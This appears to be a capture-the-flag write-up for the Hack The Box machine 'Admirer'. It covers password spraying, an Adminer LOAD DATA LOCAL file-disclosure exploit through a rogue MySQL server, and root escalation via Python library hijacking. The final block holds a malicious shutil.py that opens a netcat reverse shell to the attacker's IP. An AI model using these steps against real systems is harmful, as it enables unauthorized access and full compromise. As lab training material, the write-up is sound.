<p align="center">
  <img src="assets/Admirer.jpg" alt='HTB_admirer'>
</p>


### Description:

- Enumerating the web reveals a 403 directory
- Enumerating the 403 directory gives us a contacts and credentials
- Logging into ftp with the obtained credentials
- Downloading the available tar.gz file
- A password is enumerated in the index.php file
- utility-scripts is a 403 dir, which has adminer.php in it
- Exploiting adminer's `LOAD DATA LOCAL` vulnerablity, a new pass phrase is obtained in index.php
- SSH into the box as waldo from the newly obtained password
- In the opt directory, admin_tasks.sh runs as sudo
- Python Path hijacking gives reverse shell as `root`

### Difficulty:

`Linux - Easy`


#### Enumeration

- Open ports `21, 22, 80`
- Ports `vsftpd, ssh and http` are open
- Anonymous login is `not` allowed in port 21
- `robots.txt` found in the web which blocks `admin-dir` from being spidered
- admin-dir returns a `403` which means, enumerating files in that folder reveals `contacts` and `credentials` text files
- Credentials and Contacts files reveals some `usernames, emails and passwords`
- Bruteforcing `ssh` returns nothing, the user and password from the credentials.txt for the `ftpuser` worked with ftp login
- FTP lists two files, `html.tar.gz` and `dump.sql`
- While looking at the contents of the html.tar.gz, the `admin-tasks.php` in the `utility-scripts` dir
- The `admin_tasks.sh` is enumerated which gets options from the user and exectes in bash via `shell_exec()`
- This `admin-tasks.php` doesnt do anything due to whitelist
- Accessing the `utility-scripts` in the browser gives a `403`, forbidden so enumerating files in the utility-scripts reveals `adminer.php`	
- In the adminer.php try to login with the available credentials.
- Login fails and looking for open exploits, found [here](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability)
- Create a database {DeleteMeWhenDone}, create a user{ippsec'@'10.10.10.187} in the database with the password {DontExploitMePls}
- Grant all the users to the created user


#### Obtaining Shell
##### Password from index.php from /var/www/html

- Login in the `adminer.php` with the server `10.10.14.2`, which is the IP of the hacking machine and username `ippsec` and password `DontExploitMePls` and the database `DeleteMeWhenDone`
- Reading through the exploit for the adminer.php, the `LOAD DATA LOCAL` command in the sql commands is vulnerable
- Load the `index.html` file for testing, accessing `/etc/passwd` is not possible since `open_basedir` is set to /var/www/html in the `info.php`
- With successful execution the requested file will be loaded in the specified table, access the contents from the table
- With the loaded index.php form the sql, a different credential is obtained for waldo.
- SSH into waldo with the newly obtained password
- user.txt is obtained


#### Privilege Escalation

- In the `/var/scripts/`, 2 scripts admin-tasks and backup.py is available
- backup.py uses the `make_archive()` from the  `shutil` library 
- Hijacking the python library leads us to root the machine
- Create a library file with vulnerable code and set the `PYTHONPATH` to execute the malicious library
- Executing the admin_tasks.sh with the /dev/shm path gives a reverse shell as root
- root.txt obtained

#### COMMANDS:

```bash
# password spraying on ssh with crackmapexec
crackmapexec ssh 10.10.10.187 -u user_file -p pass_file
```

```bash
# search for the files that contains the phrase password in it
grep -ir password
```

```bash
# creating a mysql server to connect back
# switch to mysql in attacking machine
sudo mysql -u root 

# create a database to store tables and values
create Database DeleteMeWhenDone; # database name = DeleteMeWhenDone

#createa user in the database with the password
create user 'ippsec'@'10.10.10.187' IDENTIFIED BY 'DontExploitMePls'; # creating a user on the 10.10.10.187(on the attack machine) with the password DontExploitMePls

# Granting permissions to the database
GRANT ALL on DeleteMeWhenDone.* TO 'ippsec'@'10.10.10.187'; #only allow ippsec@10.10.10.187 to connect to the mysql database
FLUSH PRIVILEDGES; # refresh Privileges
```

```bash
# socat service forward
# forward everything that occurs on 10.10.12.4:3006 to 127.0.0.1
# listen on port 3006, from the address 10.10.14.2 and forward it to 127.0.0.1
socat TCP-LISTEN:3306,fork,bind=10.10.14.2 TCP:127.0.0.1:3306
``` 

```bash 
# create a new table in the database
sudo mysql -u root

# select the database which needs to be modified
use DeleteMeWhenDone;

# create a table
create table PleaseSubscribe (OUTPUT TEXT(4096));
```

```bash
# adminer.php exploit LOAD DATA LOCAL
# /etc/hosts access shows error since the open_basedir in the info.php is set only to /var/www/html 
LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE PleaseSubscribe FIELDS TERMINATED BY "\n"

# after the file is loaded access it from your kali machine's sql
sudo mysql -u root

# select the database
use DeleteMeWhenDone;

# select the table to view its contents
select * from PleaseSubscribe;
```

```python
# Hijacking the library, create a file named shutil.py with the following contents
import os

def make_archive(a,b,c):
	os.system("nc -c bash 10.10.14.2 9001")

# set PYTHONPATH to where the malicious python script is. Temporariry tell the following program to where to look for library items
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```